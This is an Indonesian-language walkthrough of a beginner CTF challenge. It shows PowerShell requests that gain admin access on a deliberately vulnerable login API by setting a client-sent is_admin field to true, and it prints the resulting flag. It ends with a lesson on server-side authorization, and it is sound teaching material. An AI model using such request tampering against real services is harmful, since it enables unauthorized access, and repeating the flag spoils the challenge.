# SOLVE — Manipulasi Request Body

Panduan langkah-demi-langkah untuk menyelesaikan soal CTF "Manipulasi Request Body".
Dari buka terminal sampai dapat flag.

> Catatan: gunakan **PowerShell**, bukan cmd.exe — karena perintah `Invoke-RestMethod`
> hanya jalan di PowerShell, bukan di command prompt biasa.

---

## Step 1 — Buka PowerShell

Tekan tombol **Windows**, ketik `PowerShell`, lalu klik **Windows PowerShell**.
Muncul jendela biru dengan prompt seperti `PS C:\Users\RC251018>`.

Arti: PowerShell adalah tempat mengetik perintah. Prompt `PS ...>` berarti ia siap
menerima perintah.

---

## Step 2 — Kirim Login "Biasa" dulu

Copy-paste perintah ini ke PowerShell, lalu tekan Enter:

```powershell
Invoke-RestMethod -Uri "https://reza-s-ctf-challange.vercel.app/api/login" -Method POST -ContentType "application/json" -Body '{"username":"guest","is_admin":false}' | Format-List
```

Penjelasan per bagian:

| Bagian | Arti |
|--------|------|
| `Invoke-RestMethod` | Kirim request ke internet |
| `-Uri` | Alamat tujuan |
| `-Method POST` | Jenis request POST |
| `-ContentType "application/json"` | Beritahu server datanya berbentuk JSON |
| `-Body '...'` | Isi data yang dikirim (login sebagai guest) |
| `\| Format-List` | Tampilkan hasil ke bawah, bukan tabel |

Response yang muncul:

```
success : False
message : Login sukses sebagai guest. Tapi kamu bukan admin! Akses flag ditolak.
          Coba manipulasi request body JSON Anda menjadi admin dengan is_admin true!
hint    : @{expected_username=admin; expected_is_admin=True}
```

---

## Step 3 — Baca Petunjuk dari Response

Di response ada baris `hint`. Itu petunjuk dari server:

- `expected_username = admin` → username harus `admin`
- `expected_is_admin = True` → field `is_admin` harus `true`

Karena field `is_admin` dikirim dari sisi kita (di `-Body`), nilainya bisa langsung
diubah dari `false` jadi `true`. Itulah inti "manipulasi request body".

---

## Step 4 — Manipulasi Body, Ambil Flag

Ganti isi `-Body` jadi admin, dan ambil flag-nya langsung. Copy-paste:

```powershell
(Invoke-RestMethod -Uri "https://reza-s-ctf-challange.vercel.app/api/login" -Method POST -ContentType "application/json" -Body '{"username":"admin","is_admin":true}').flag
```

Perbedaan dengan Step 2:

- Body jadi `{"username":"admin","is_admin":true}` (guest → admin, false → true)
- Dibungkus tanda kurung `( ... )` lalu `.flag` di akhir → ambil hanya isi field flag

Response yang muncul:

```
FLAG{m4n1pul451_b0dy_v3rc3l_ok}
```

---

## Selesai

Hanya 4 langkah dari buka PowerShell sampai flag. Yang berubah dari Step 2 ke
Step 4 cuma isi `-Body` (guest → admin, false → true).

## Pelajaran Keamanan

Di dunia nyata, status admin/otorisasi **tidak boleh** ditentukan dari field yang
dikirim client seperti `is_admin`. Itu harus diverifikasi di server melalui
session, JWT yang ditandatangani, atau role dari database. Soal ini sengaja
dibuat rentan untuk tujuan pembelajaran.
